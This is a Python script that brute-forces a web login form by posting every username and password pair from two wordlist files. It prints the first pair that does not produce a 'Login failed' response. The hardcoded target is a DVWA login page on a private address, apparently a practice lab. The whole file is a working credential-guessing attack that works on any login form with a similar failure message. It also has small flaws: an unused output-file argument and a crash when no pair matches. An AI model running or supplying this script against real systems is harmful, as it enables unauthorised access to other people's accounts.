#!/usr/bin/python

import requests

from handlers.file_handler import read_data_from_file


def password_bruteforce(url: str, login: list[str], password: list[str], ):
    data_loginform = {"username": "",
                      "password": "",
                      "Login": "submit"}
    for name in login:
        for password_name in password:
            data_loginform["username"] = name
            data_loginform["password"] = password_name
            response = requests.post(url, data=data_loginform)

            if 'Login failed' not in response.content.decode():
                print(f'[+] Got the login and the password ==> {name} | {password_name}')
                return name, password_name


def main(url: str, login: str, password: str, write_file: str = 'password_success'):
    logline_dictionary = read_data_from_file(login)
    password_dictionary = read_data_from_file(password)
    login_success, password_success = password_bruteforce(url, logline_dictionary, password_dictionary)


if __name__ == '__main__':
    # url, wordlist_file, filename_to_write = get_argparse()

    target_url = "http://10.0.2.12/dvwa/login.php"
    wordlist_password = "password_dictionaries/passwords.txt"
    wordlist_login = "password_dictionaries/login.txt"
    filename_to_write = "password_success_test"

    main(target_url, wordlist_login, wordlist_password, filename_to_write)
